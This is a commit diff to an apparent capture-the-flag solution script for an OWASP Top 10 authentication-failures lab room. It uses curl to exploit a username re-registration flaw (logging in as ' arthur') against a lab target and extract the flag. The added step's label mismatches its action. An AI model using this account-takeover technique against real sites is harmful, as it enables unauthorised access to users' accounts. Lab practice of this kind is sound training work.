2faf66d1c4af55b3b43662de377400e62de2794d
Nadege Lemperiere <nadege.lemperiere@gmail.com>
2024-11-30 22:31:37 -0500

    Testing script

--- rooms/owasptop102021/7-identification-and-authentication-failures.sh
+++ rooms/owasptop102021/7-identification-and-authentication-failures.sh
@@ -32,6 +32,9 @@ curl -s -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -L 
 
 # Logging as arthur
 echo "5 - ANALYZING ARTHUR"
-curl -s -X POST "http://$target_ip:8088/" -b /work/7-cookies.txt -L -d "user=+arthur" -d "pass=test" -v -o /work/7-arthur.html
+curl -s -X POST "http://$target_ip:8088/" -b /work/7-cookies.txt -L -d "user=+arthur" -d "pass=test" -o /work/7-arthur.html
 echo "--> Flag is : $(sed -n ':a;N;$!ba;s/.*<p[^>]*>\(.*\)<\/p>.*/\1/p' /work/7-arthur.html | sed ':a;N;$!ba;s/[\n\t ]//g')"
 
+# Registering nadege a second time
+echo "4 - REGISTERING ARTHUR"
+curl -s -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -L -F "user=nadege" -F "email=arthur@gmail.com" -F "pass=test" -F "submit=Register" >/dev/null
